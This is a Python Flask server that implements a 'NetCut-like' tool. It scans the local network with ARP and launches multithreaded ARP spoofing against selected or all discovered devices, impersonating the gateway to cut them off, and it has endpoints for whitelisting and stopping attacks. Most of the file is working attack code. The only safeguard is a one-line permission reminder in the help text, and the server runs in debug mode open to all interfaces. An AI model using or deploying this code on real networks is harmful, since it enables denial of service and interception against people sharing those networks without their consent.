import platform
from flask import Flask, request, jsonify
from flask_cors import CORS
import psutil
import netifaces
from scapy.all import ARP, Ether, srp, send
import threading
import json
import os
import time
app = Flask(__name__)
CORS(app)

# File paths for JSON storage
interfaces_file_path = 'network_interfaces.json'  # For network interfaces
json_file_path = 'network_devices.json'  # For scanned network devices
whitelist_file_path = 'ip_whitelist.json'  # For IP whitelist

# List to store active threads and events for ARP spoofing
active_threads = []
stop_events = []
target_ips_list = []

def ensure_json_file_exists(file_path, initial_data):
    """Ensure the JSON file exists; if not, create it with initial data."""
    if not os.path.exists(file_path):
        with open(file_path, 'w') as json_file:
            json.dump(initial_data, json_file, indent=4)

def list_network_interfaces():
    if platform.system() == 'Windows':
        return list_network_interfaces_windows()
    else:
        return list_network_interfaces_linux()

def list_network_interfaces_windows():
    import pythoncom
    import wmi
    pythoncom.CoInitialize()  # Initialize COM for WMI access
    c = wmi.WMI()
    interfaces = []
    
    for interface in c.Win32_NetworkAdapterConfiguration(IPEnabled=True):
        name = interface.Description
        guid = interface.SettingID
        interfaces.append({"name": name, "guid": guid})
    
    return interfaces

def list_network_interfaces_linux():
    interfaces = []
    for iface in psutil.net_if_addrs().keys():
        if iface != 'lo':  # Skip loopback
            interfaces.append({"name": iface, "guid": iface})
    return interfaces

def arp_spoofing_manager(gateway_ip, num_threads):
    global stop_events, active_threads
    while True:
        with threading.Lock():
            current_target_ips = list(target_ips_list)  # Safely copy the shared list

        # Stop all previous spoofing threads
        for stop_event in stop_events:
            stop_event.set()

        for thread in active_threads:
            if thread.is_alive():
                thread.join()

        # Clear previous threads and events
        stop_events.clear()
        active_threads.clear()

        # Create new threads for current target IPs
        stop_events = [threading.Event() for _ in range(len(current_target_ips))]

        for _ in range(num_threads):
            for ip, stop_event in zip(current_target_ips, stop_events):
                thread = threading.Thread(target=arp_spoof, args=(ip, gateway_ip, stop_event))
                thread.start()
                active_threads.append(thread)

        time.sleep(360)  # Sleep before checking for new IPs again


def save_interfaces_to_json():
    """Save the list of network interfaces to a JSON file."""
    interfaces = list_network_interfaces()
    ensure_json_file_exists(interfaces_file_path, [])
    with open(interfaces_file_path, 'w') as json_file:
        json.dump(interfaces, json_file, indent=4)

def load_interfaces_from_json():
    """Load the list of network interfaces from a JSON file."""
    ensure_json_file_exists(interfaces_file_path, [])
    with open(interfaces_file_path, 'r') as json_file:
        interfaces = json.load(json_file)
    return interfaces

def get_gateway_and_netmask(interface_guid):
    iface_info = netifaces.ifaddresses(interface_guid)
    
    gateway_info = netifaces.gateways()
    gateway_ip = gateway_info['default'][netifaces.AF_INET][0]
    netmask = iface_info[netifaces.AF_INET][0]['netmask']
    
    ip_range = f"{gateway_ip}/{netmask_to_cidr(netmask)}"
    return ip_range, gateway_ip

def netmask_to_cidr(netmask):
    return sum([bin(int(x)).count('1') for x in netmask.split('.')])

def get_local_ip(interface_guid):
    iface_info = netifaces.ifaddresses(interface_guid)
    local_ip = iface_info[netifaces.AF_INET][0]['addr']
    return local_ip

def scan_network(ip_range, local_ip, gateway_ip):
    devices = []
    whitelist = load_whitelist_from_json()
    for _ in range(3):
        arp_request = ARP(pdst=ip_range)
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        answered_list = srp(arp_request_broadcast, timeout=4, verbose=False)[0]

        for element in answered_list:
            ip = element[1].psrc
            if ip != local_ip and ip != gateway_ip and ip not in whitelist:
                devices.append({'ip': ip, 'mac': element[1].hwsrc})
    
    update_devices_in_json(devices)
    
    return devices

def load_devices_from_json():
    """Load the list of scanned devices from a JSON file."""
    ensure_json_file_exists(json_file_path, [])
    with open(json_file_path, 'r') as json_file:
        devices = json.load(json_file)
    return devices

def update_devices_in_json(new_devices):
    ensure_json_file_exists(json_file_path, [])  # Ensure the JSON file exists
    existing_devices = load_devices_from_json()

    # Update the devices list with new devices, avoiding duplicates
    for new_device in new_devices:
        if not any(device['ip'] == new_device['ip'] for device in existing_devices):
            existing_devices.append(new_device)

    with open(json_file_path, 'w') as json_file:
        json.dump(existing_devices, json_file, indent=4)

def force_stop_all_spoofing():
    global stop_events, active_threads
    for stop_event in stop_events:
        stop_event.set()  # Signal to stop the thread
    
    # Wait for all threads to finish
    for thread in active_threads:
        if thread.is_alive():
            thread.join(timeout=1)  # Timeout to forcefully join threads

    # Clear the list of threads and events after stopping
    active_threads.clear()
    stop_events.clear()
    print("Force stopped all ARP spoofing threads due to error.")

def arp_spoof(target_ip, gateway_ip, stop_event):
    try:
        target_mac = get_mac(target_ip)
        if target_mac is None:
            return

        while not stop_event.is_set():
            arp_response = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
            send(arp_response, verbose=False)

    except Exception as e:
        print(f"Error during ARP spoofing: {e}")
        force_stop_all_spoofing()

    finally:
        restore_network(target_ip, gateway_ip)

def get_mac(ip):
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = srp(arp_request_broadcast, timeout=2, verbose=False)[0]
    if len(answered_list) == 0:
        return None
    return answered_list[0][1].hwsrc

def restore_network(target_ip, gateway_ip):
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)
    if target_mac and gateway_mac:
        arp_response = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac)
        send(arp_response, verbose=False, count=3)

@app.route('/start_netcut', methods=['POST'])
def api_start_netcut():
    global active_threads, target_ips_list

    if any(thread.is_alive() for thread in active_threads):
        return jsonify({"error": "ARP spoofing attack is already running. Stop it before starting a new one."}), 400

    data = request.get_json()

    if 'interface' not in data or not isinstance(data['interface'], int):
        return jsonify({"error": "Invalid or missing 'interface' field. It must be an integer."}), 400
    interface_idx = data['interface']

    if 'target_ips' not in data or not isinstance(data['target_ips'], (str, list)):
        return jsonify({"error": "Invalid or missing 'target_ips' field. It must be a string 'all' or a list of IPs."}), 400
    target_ips = data['target_ips']

    if 'num_threads' not in data:
        return jsonify({"error": "Missing 'num_threads' field."}), 400
    if not isinstance(data['num_threads'], int) or data['num_threads'] <= 0:
        return jsonify({"error": "'num_threads' must be a positive integer."}), 400
    num_threads = data['num_threads']

    if num_threads > 500:
        return jsonify({"error": "The number of threads exceeds the maximum limit of 500."}), 400

    available_interfaces = load_interfaces_from_json()

    if interface_idx >= len(available_interfaces):
        return jsonify({"error": "Invalid interface index."}), 400

    selected_interface_guid = available_interfaces[interface_idx]['guid']
    _, gateway_ip = get_gateway_and_netmask(selected_interface_guid)

    whitelist = load_whitelist_from_json()

    if target_ips == "all":
        scanned_devices = load_devices_from_json()
        target_ips_list = [device['ip'] for device in scanned_devices]
    else:
        target_ips_list = [ip.strip() for ip in target_ips]

    filtered_ips_list = [ip for ip in target_ips_list if ip not in whitelist]

    filtered_ips_list = list(set(filtered_ips_list))

    if not filtered_ips_list:
        return jsonify({
            "warning": "All target IPs are whitelisted or already affected. No IPs will be spoofed.",
            "whitelist": whitelist
        }), 200

    threading.Thread(target=arp_spoofing_manager, args=(gateway_ip, num_threads)).start()

    return jsonify({
        "status": f"ARP spoofing attack started on {len(filtered_ips_list)} selected IPs with {num_threads} threads",
        "whitelist": whitelist,
        "affected_ips": filtered_ips_list
    })

def load_whitelist_from_json():
    """Load the IP whitelist from a JSON file."""
    ensure_json_file_exists(whitelist_file_path, [])
    with open(whitelist_file_path, 'r') as json_file:
        whitelist = json.load(json_file)
    return whitelist

def add_ip_to_whitelist(ip):
    """Add an IP address to the whitelist."""
    whitelist = load_whitelist_from_json()
    if ip not in whitelist:
        whitelist.append(ip)
        with open(whitelist_file_path, 'w') as json_file:
            json.dump(whitelist, json_file, indent=4)

def remove_ip_from_whitelist(ip):
    """Remove an IP address from the whitelist."""
    whitelist = load_whitelist_from_json()
    if ip in whitelist:
        whitelist.remove(ip)
        with open(whitelist_file_path, 'w') as json_file:
            json.dump(whitelist, json_file, indent=4)

@app.route('/whitelist', methods=['POST'])
def add_to_whitelist():
    global stop_events, active_threads
    
    if any(thread.is_alive() for thread in active_threads):
        force_stop_all_spoofing()

    data = request.get_json()
    ips = data.get('ip')
    if not ips:
        return jsonify({"error": "No IP address provided"}), 400

    if isinstance(ips, list):
        added_ips = []
        already_whitelisted = []
        for ip in ips:
            if ip not in load_whitelist_from_json():
                add_ip_to_whitelist(ip)
                added_ips.append(ip)
            else:
                already_whitelisted.append(ip)
        
        if added_ips:
            return jsonify({"status": f"IPs {added_ips} added to whitelist", "skipped": already_whitelisted}), 200
        else:
            return jsonify({"error": f"All provided IPs are already in the whitelist", "skipped": already_whitelisted}), 400

    elif isinstance(ips, str):
        if ips not in load_whitelist_from_json():
            add_ip_to_whitelist(ips)
            return jsonify({"status": f"IP {ips} added to whitelist"}), 200
        else:
            return jsonify({"error": f"IP {ips} is already in the whitelist"}), 400

    else:
        return jsonify({"error": "Invalid IP format provided"}), 400

@app.route('/whitelist', methods=['DELETE'])
def remove_from_whitelist():
    global stop_events, active_threads
    
    if any(thread.is_alive() for thread in active_threads):
        force_stop_all_spoofing()

    data = request.get_json()
    ips = data.get('ip')
    if not ips:
        return jsonify({"error": "No IP address provided"}), 400

    if isinstance(ips, list):
        removed_ips = []
        not_in_whitelist = []
        for ip in ips:
            if ip in load_whitelist_from_json():
                remove_ip_from_whitelist(ip)
                removed_ips.append(ip)
            else:
                not_in_whitelist.append(ip)
        
        if removed_ips:
            return jsonify({"status": f"IPs {removed_ips} removed from whitelist", "skipped": not_in_whitelist}), 200
        else:
            return jsonify({"error": f"None of the provided IPs are in the whitelist", "skipped": not_in_whitelist}), 400

    elif isinstance(ips, str):
        if ips in load_whitelist_from_json():
            remove_ip_from_whitelist(ips)
            return jsonify({"status": f"IP {ips} removed from whitelist"}), 200
        else:
            return jsonify({"error": f"IP {ips} is not in the whitelist"}), 400

    else:
        return jsonify({"error": "Invalid IP format provided"}), 400

@app.route('/whitelist', methods=['GET'])
def get_whitelist():
    """Get the list of IPs in the whitelist."""
    whitelist = load_whitelist_from_json()
    return jsonify(whitelist)

# New Endpoint: Scan Network Interfaces and Save to JSON
@app.route('/scan_interfaces', methods=['GET'])
def scan_interfaces():
    save_interfaces_to_json()  # Save the scanned interfaces to a JSON file
    return jsonify({"status": "Success Scan interfaces"}), 200


@app.route('/interface_data', methods=['GET'])
def get_interface_data():
    """Get the network interfaces from the JSON file."""
    ensure_json_file_exists(interfaces_file_path, [])
    with open(interfaces_file_path, 'r') as json_file:
        interfaces = json.load(json_file)
    return jsonify(interfaces)

@app.route('/scan_network_data', methods=['GET'])
def get_scan_network():
    """Get the scanned network devices from the JSON file."""
    ensure_json_file_exists(json_file_path, [])
    with open(json_file_path, 'r') as json_file:
        devices = json.load(json_file)
    return jsonify(devices)

@app.route('/scan_network', methods=['GET'])
def api_scan_network():
    interface_idx = int(request.args.get('interface', 0))
    available_interfaces = load_interfaces_from_json()
    
    if interface_idx >= len(available_interfaces):
        return jsonify({"error": "Invalid interface index"}), 400

    selected_interface_guid = available_interfaces[interface_idx]['guid']
    ip_range, gateway_ip = get_gateway_and_netmask(selected_interface_guid)
    local_ip = get_local_ip(selected_interface_guid)
    devices = scan_network(ip_range, local_ip, gateway_ip)
    
    return jsonify(devices)

@app.route('/stop_netcut', methods=['POST'])
def api_stop_netcut():
    global stop_events, active_threads
    # Stop all active threads
    for stop_event in stop_events:
        stop_event.set()  # Set event to stop the thread
    
    # Wait for all threads to finish
    for thread in active_threads:
        if thread.is_alive():
            thread.join()

    # Clear the list of threads and events after stopping
    active_threads.clear()
    stop_events.clear()

    return jsonify({"status": "ARP spoofing attack stopped for all IPs"})

@app.route('/force_stop_netcut', methods=['POST'])
def api_force_stop_netcut():
    global stop_events, active_threads
    # Force stop all active threads
    for stop_event in stop_events:
        stop_event.set()  # Set event to stop the thread
    
    # Wait for all threads to finish
    for thread in active_threads:
        if thread.is_alive():
            thread.join(timeout=1)  # Timeout to forcefully join threads

    # Clear the list of threads and events after stopping
    active_threads.clear()
    stop_events.clear()

    return jsonify({"status": "ARP spoofing attack forcefully stopped and session cleared"}), 200

# Help Endpoint
@app.route('/help', methods=['GET'])
def api_help():
    help_info = {
        "description": "NetCut-like API",
        "endpoints": {
            "/scan_interfaces": {
                "method": "GET",
                "description": "Scan available network interfaces and save them to JSON."
            },
            "/scan_network": {
                "method": "GET",
                "description": "Scan devices on the network, excluding whitelisted IPs.",
                "parameters": {
                    "interface": "Index of the network interface (default is 0)."
                }
            },
            "/start_netcut": {
                "method": "POST",
                "description": "Start ARP spoofing on the specified IPs.",
                "parameters": {
                    "interface": "Index of the network interface.",
                    "target_ips": 'List of IPs or "all" to target all scanned devices.',
                    "num_threads": "Number of threads to use (default is 10)."
                }
            },
            "/stop_netcut": {
                "method": "POST",
                "description": "Stop all running ARP spoofing attacks."
            },
            "/force_stop_netcut": {
                "method": "POST",
                "description": "Forcefully stop all running ARP spoofing attacks and clear the session."
            },
            "/whitelist": {
                "method": "GET",
                "description": "Get the list of whitelisted IPs."
            },
            "/whitelist": {
                "method": "POST",
                "description": "Add an IP to the whitelist, stopping ARP spoofing if it is running.",
                "parameters": {
                    "ip": "The IP address to be added to the whitelist."
                }
            },
            "/whitelist": {
                "method": "DELETE",
                "description": "Remove an IP from the whitelist, stopping ARP spoofing if it is running.",
                "parameters": {
                    "ip": "The IP address to be removed from the whitelist."
                }
            },
            "/help": {
                "method": "GET",
                "description": "Display this help message."
            }
        },
        "note": "Ensure you have permission to perform network scanning and ARP spoofing on the network you are testing."
    }
    return jsonify(help_info)

if __name__ == '__main__':
    ensure_json_file_exists(whitelist_file_path, [])  # Ensure the whitelist file exists
    app.run(host='0.0.0.0', port=5000, debug=True)
